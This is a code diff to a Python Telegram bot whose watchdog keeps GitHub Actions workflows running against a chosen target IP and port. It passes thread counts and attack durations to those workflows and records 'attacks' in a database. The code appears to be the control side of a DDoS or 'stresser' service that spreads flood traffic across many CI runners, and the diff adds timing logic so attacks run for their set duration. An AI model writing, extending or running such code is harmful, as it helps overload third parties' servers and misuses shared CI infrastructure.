@@ -3,9 +3,9 @@ from pyrogram import Client
 import logging
 import asyncio
 import threading
-from config import (API_ID, API_HASH, BOT_TOKEN, OWNER_ID, PORT,
-                   WORKFLOW_COUNT)
-import state  # shared state - circular import এড়াতে
+import time
+from config import (API_ID, API_HASH, BOT_TOKEN, OWNER_ID, PORT, WORKFLOW_COUNT)
+import state
 
 logging.basicConfig(
     level=logging.INFO,
@@ -13,7 +13,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Client
 app = Client(
     "tester_bot",
     api_id=API_ID,
@@ -44,21 +43,55 @@ callbacks.register(app)
 
 # ===== WATCHDOG LOOP =====
 async def watchdog_loop():
-    """প্রতি ১ মিনিটে চেক, বন্ধ থাকলে চালু"""
     from services.github import get_all_runs, trigger_workflow
+    from database import load, save
+    from datetime import datetime
     logger.info("🐕 Watchdog started")
 
     while True:
         try:
             if state.watchdog_enabled and state.current_target["ip"]:
+
+                # ===== DURATION CHECK =====
+                # Attack শুরুর সময় থেকে duration পার হলে watchdog বন্ধ করো
+                started_at = state.current_target.get("started_at", 0)
+                duration   = state.current_target.get("duration", 0)
+
+                if started_at and duration:
+                    elapsed = time.time() - started_at
+                    if elapsed >= duration:
+                        logger.info(f"⏰ Duration {duration}s completed. Stopping watchdog.")
+                        state.watchdog_enabled = False
+                        state.current_target = {
+                            "ip": None, "port": None,
+                            "threads": 1000, "duration": 0, "started_at": 0
+                        }
+                        # DB তে attack status update করো
+                        attacks = load("attacks")
+                        for aid, a in attacks.items():
+                            if a.get("status") == "running":
+                                a["status"] = "completed"
+                                a["stopped_at"] = datetime.now().isoformat()
+                        save("attacks", attacks)
+                        logger.info("✅ Attack marked as completed")
+                        await asyncio.sleep(60)
+                        continue
+
+                # ===== RUNNING CHECK =====
                 wf_status = get_all_runs()
                 running_count = sum(
                     1 for wf, s in wf_status.items()
                     if wf.startswith("bot") and s in ["in_progress", "queued"]
                 )
 
-                if running_count < WORKFLOW_COUNT:
-                    logger.info(f"⚠️ {running_count}/{WORKFLOW_COUNT} running, restarting...")
+                remaining = 0
+                if started_at and duration:
+                    elapsed   = time.time() - started_at
+                    remaining = max(0, int(duration - elapsed))
+
+                if running_count < WORKFLOW_COUNT and remaining > 60:
+                    # Duration এ কমপক্ষে ৬০ সেকেন্ড বাকি থাকলেই restart
+                    logger.info(f"⚠️ {running_count}/{WORKFLOW_COUNT} running, {remaining}s remaining — restarting...")
                     for i in range(1, WORKFLOW_COUNT + 1):
                         wf = f"bot{i}.yml"
                         if wf_status.get(wf) not in ["in_progress", "queued"]:
@@ -66,11 +99,15 @@ async def watchdog_loop():
                                 wf,
                                 state.current_target["ip"],
                                 state.current_target["port"],
-                                state.current_target["threads"]
+                                state.current_target["threads"],
+                                remaining  # বাকি সময়টুকুই duration হিসেবে দাও
                             )
                             await asyncio.sleep(1)
+                elif running_count >= WORKFLOW_COUNT:
+                    logger.info(f"✅ {running_count}/{WORKFLOW_COUNT} running | {remaining}s remaining")
                 else:
-                    logger.info(f"✅ {running_count}/{WORKFLOW_COUNT} running")
+                    logger.info(f"⏰ <60s remaining, not restarting")
+
         except Exception as e:
             logger.error(f"Watchdog error: {e}")
 
@@ -87,11 +124,17 @@ flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
+    started_at = state.current_target.get("started_at", 0)
+    duration   = state.current_target.get("duration", 0)
+    elapsed    = int(time.time() - started_at) if started_at else 0
+    remaining  = max(0, duration - elapsed) if duration else 0
     return {
         "status": "alive",
         "watchdog": state.watchdog_enabled,
         "target": f"{state.current_target['ip']}:{state.current_target['port']}"
-                  if state.current_target["ip"] else None
+                  if state.current_target["ip"] else None,
+        "elapsed": elapsed,
+        "remaining": remaining
     }, 200
 
 @flask_app.route('/health')
